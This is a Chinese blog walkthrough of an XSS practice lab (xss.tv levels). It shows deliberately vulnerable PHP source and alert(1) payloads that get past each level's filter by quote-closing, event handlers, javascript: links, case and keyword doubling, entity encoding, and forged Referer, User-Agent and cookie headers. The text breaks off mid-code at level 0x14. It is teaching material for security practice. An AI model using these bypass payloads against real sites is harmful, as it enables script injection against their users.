        <content type="html"><![CDATA[<h1 id="XSS弹窗闯关练习"><a href="#XSS弹窗闯关练习" class="headerlink" title="XSS弹窗闯关练习"></a>XSS弹窗闯关练习</h1><br><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机源码与 <a href="http://test.xss.tv/">http://test.xss.tv</a> 的题目是一样的,并且删除了后面几道已经失效的Flash XSS题目,本文连接来自<a href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-41">@国光</a>博客下《XSS从零开始》文章的连接</p><blockquote><p>项目地址: <a href="https://github.com/sqlsec/xssgame">https://github.com/sqlsec/xssgame</a></p></blockquote><br><br><h2 id="0x00-先热个身吧"><a href="#0x00-先热个身吧" class="headerlink" title="0x00 先热个身吧"></a>0x00 先热个身吧</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户:&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>没有对$str进行任何过滤,echo 直接执行了JS代码</p><div class="code-wrapper"><pre><code class="hljs html">payload:?name=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><br><br><h2 id="0x01-窒息的操作"><a href="#0x01-窒息的操作" class="headerlink" title="0x01 窒息的操作"></a>0x01 窒息的操作</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>双引号闭合文本框的value,插入JS代码</p><div class="code-wrapper"><pre><code class="hljs html">payload:&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><br><br><h2 id="0x02-这该咋办啊"><a href="#0x02-这该咋办啊" class="headerlink" title="0x02 这该咋办啊"></a>0x02 这该咋办啊</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;center&gt;</span><span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span><span class="hljs-string">&lt;input name=keyword  value=&#x27;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&#x27;&gt;</span><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>单引号引号闭合文本框的value,插入JS DOM事件代码</p><div class="code-wrapper"><pre><code class="hljs html">payload:&#x27; onclick=alert(1) //</code></pre></div><br><br><h2 id="0x03-生无可恋"><a href="#0x03-生无可恋" class="headerlink" title="0x03 生无可恋"></a>0x03 生无可恋</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题对$str进行了字符串过滤.将’&lt;’ , ‘&gt;’替换成空格,仍然使用0x02的payload ,只不过这题是将双引号进行闭合,再插入 JS DOM事件代码</p><div class="code-wrapper"><pre><code class="hljs html">payload:&quot; onclick=alert(1) //</code></pre></div><br><br><h2 id="0x04-没错又是搜索"><a href="#0x04-没错又是搜索" class="headerlink" title="0x04 没错又是搜索"></a>0x04 没错又是搜索</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = strtolower(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题对$str先进行转换小写,然后将”&lt;script”替换成”&lt;scr_ipt” , “on”替换成”o_n”,思路是将双引号和括号闭合,插入超链接a标签,利用href属性执行 JS代码</p><div class="code-wrapper"><pre><code class="hljs html">payloda:&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span> //</code></pre></div><br><br><h2 id="0x05-嗯-还是搜索"><a href="#0x05-嗯-还是搜索" class="headerlink" title="0x05 嗯 还是搜索"></a>0x05 嗯 还是搜索</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<span class="hljs-variable">$str6</span>=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题进行诸多过滤,但是没有进行大小写限制,所以使用大写0x04的payload进行绕过</p><div class="code-wrapper"><pre><code class="hljs html">payloda:&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">Href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span> //</code></pre></div><br><br><h2 id="0x06-猜一猜下面题目还有搜索嘛"><a href="#0x06-猜一猜下面题目还有搜索嘛" class="headerlink" title="0x06 猜一猜下面题目还有搜索嘛"></a>0x06 猜一猜下面题目还有搜索嘛</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> =strtolower( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<span class="hljs-variable">$str6</span>=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题相对于第六题,过滤替换成空,写进行了大小写限制,但是程序只是运行一次,所以可以将标签双写进行绕过</p><div class="code-wrapper"><pre><code class="hljs html">payload:&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">scrSCRIPTipt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scrSCRIPTipt</span>&gt;</span></code></pre></div><br><br><h2 id="0X07-老铁要和我换友链嘛？"><a href="#0X07-老铁要和我换友链嘛？" class="headerlink" title="0X07 老铁要和我换友链嘛？"></a>0X07 老铁要和我换友链嘛？</h2><div class="code-wrapper"><pre><code class="hljs php+HTML">&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?php echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;?&gt;</code></pre></div><p>本题对$str进行了小写限制和过滤,但是经过过滤后的$str7使用在 a标签的href属性上面,href属性可以使用JavaScript协议来执行JS代码</p><div class="code-wrapper"><pre><code class="hljs html">payload:JavaScrip<span class="hljs-symbol">&amp;#x74;</span>:alert(1)因为&quot;script&quot;会被过滤替换成&quot;scr_ipt&quot;,所以将字母进行编码HTML实体,HTML实体在浏览器解析时会进行解码还原字符</code></pre></div><br><br><h2 id="0x08-添加友连again"><a href="#0x08-添加友连again" class="headerlink" title="0x08 添加友连again"></a>0x08 添加友连again</h2><div class="code-wrapper"><pre><code class="hljs php+HTML">&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?phpif(false===strpos($str7,&#x27;http://&#x27;))&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;        &#125;else&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;?&gt;</code></pre></div><p>本题与第八题基本相似,但是加入了一个限制,传入的值必须包含”http://“,但是没有限制出现的位置,所以只要传入的值包含就行</p><div class="code-wrapper"><pre><code class="hljs html">payload:JavaScrip<span class="hljs-symbol">&amp;#x74;</span>:alert(1) // http://</code></pre></div><br><br><h2 id="0x09-嗯-搜索又出现了"><a href="#0x09-嗯-搜索又出现了" class="headerlink" title="0x09 嗯 搜索又出现了"></a>0x09 嗯 搜索又出现了</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form id=search&gt;</span><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题没有文本框,看代码发现是被设置隐藏了,所以需要将属性进行重写覆盖,对于$str11进行了’&lt;’ , ‘&gt;’过滤,因此使用JS DOM代码事件进行弹窗</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:t_sort=<span class="hljs-string">&quot; type=text onclick=javascript:alert(1) //</span></code></pre></div><br><br><h2 id="0x10-为什么这么多搜索呢"><a href="#0x10-为什么这么多搜索呢" class="headerlink" title="0x10 为什么这么多搜索呢"></a>0x10 为什么这么多搜索呢</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form id=search&gt;</span><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题依旧没有文本框 , 但是查看代码是发现 , $str11传值的地方不在URL , 而是在请求头的<a href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">REFERER</a>里面,需要伪造REFERER进行攻击</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-referer.png"></p><div class="code-wrapper"><pre><code class="hljs js">payloadt_sort=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span></code></pre></div><br><br><h2 id="0x11-黑人问号"><a href="#0x11-黑人问号" class="headerlink" title="0x11 黑人问号"></a>0x11 黑人问号</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form id=search&gt;</span><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题与第十一题 相似 , 不过本题$str11的传值的地方在请求头的UA里面 , 依旧需要伪造攻击,payload依旧是第十一题的payload</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-user-agent.png"></p><div class="code-wrapper"><pre><code class="hljs js">payloadt_sort=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span></code></pre></div><br><br><h2 id="0x12-做题好爽啊"><a href="#0x12-做题好爽啊" class="headerlink" title="0x12 做题好爽啊"></a>0x12 做题好爽啊</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>setcookie(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>);ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><span class="hljs-string">&lt;form id=search&gt;</span><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><span class="hljs-string">&lt;/form&gt;</span><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>不多说,一条payload打三题😅😅,本题伪造cookie即可,传值变量名记得改一下</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-cookie.png"></p><div class="code-wrapper"><pre><code class="hljs js">user=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span></code></pre></div><br><br><h2 id="0x13-恭喜你快要通关了"><a href="#0x13-恭喜你快要通关了" class="headerlink" title="0x13 恭喜你快要通关了"></a>0x13 恭喜你快要通关了</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>题目提供的Angular JS的链接已经失效,需要替换连接</strong></p><p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include 指令</a></p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p><div class="code-wrapper"><pre><code class="hljs js">level14.php?src=<span class="hljs-string">&quot;level1.php?name=&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;&quot;</span></code></pre></div><br><br><h2 id="0x14-厉害了-Word哥"><a href="#0x14-厉害了-Word哥" class="headerlink" title="0x14 厉害了 Word哥"></a>0x14 厉害了 Word哥</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = strtolower(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-variable">$str4</span>=str_replace(<span 